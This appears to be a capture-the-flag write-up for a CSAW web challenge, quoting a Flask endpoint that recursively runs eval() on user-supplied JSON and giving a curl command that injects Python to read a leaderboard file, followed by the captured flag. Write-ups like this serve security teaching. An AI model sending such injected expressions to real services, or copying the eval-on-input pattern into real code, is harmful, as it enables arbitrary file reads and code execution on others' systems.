# PLAYING ON THE BACKCOURTS (Web Exploitation)

### Challenge Description:

yadayada playing tennis like pong yadayada someone's cheating yadayada at least the leaderboard is safe!

### Challenge Code Analysis:

```python
@app.route('/get_eval', methods=['POST'])
def get_eval() -> Flask.response_class:
    try:
        data = request.json
        expr = data['expr']
        
        return jsonify(status='success', result=deep_eval(expr))
    
    except Exception as e:
        return jsonify(status='error', reason=str(e))


def deep_eval(expr:str) -> str:
    try:
        nexpr = eval(expr)
    except Exception as e:
        return expr
    
    return deep_eval(nexpr)
```

This function is where the entirety of the challenge resides. Basically, the `eval()` function is being used via the `/get_eval` path.

### Approach:

```bash
curl -X POST https://backcourts.ctf.csaw.io/get_eval -H "Content-Type: application/json" -d "{\"expr\": \"open('leaderboard.txt').read()\"}"
```

### Flag:
`csawctf{5H1774K3_Mu5Hr00M5_1_fuX0R3d_Up_50n_0F_4_81207CH}`